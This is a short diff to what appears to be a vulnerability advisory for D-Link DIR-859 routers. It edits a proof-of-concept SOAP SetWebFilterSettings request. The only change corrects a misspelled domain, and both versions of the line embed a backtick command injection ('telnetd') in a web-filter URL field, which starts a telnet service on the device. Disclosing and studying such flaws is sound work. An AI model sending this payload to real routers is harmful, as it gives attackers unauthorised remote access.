@@ -26,7 +26,7 @@ An issue was discovered on D-Link DIR-859 devices with the latest firmware versi
  <NumberOfEntry>2</NumberOfEntry>
  <WebFilterURLs>
   <string>www.baidu.com</string>
- <string>www.shohu.com`telnetd`</string></WebFilterURLs>
+ <string>www.sohu.com`telnetd`</string></WebFilterURLs>
 </SetWebFilterSettings>
 </soap:Body>
 </soap:Envelope>
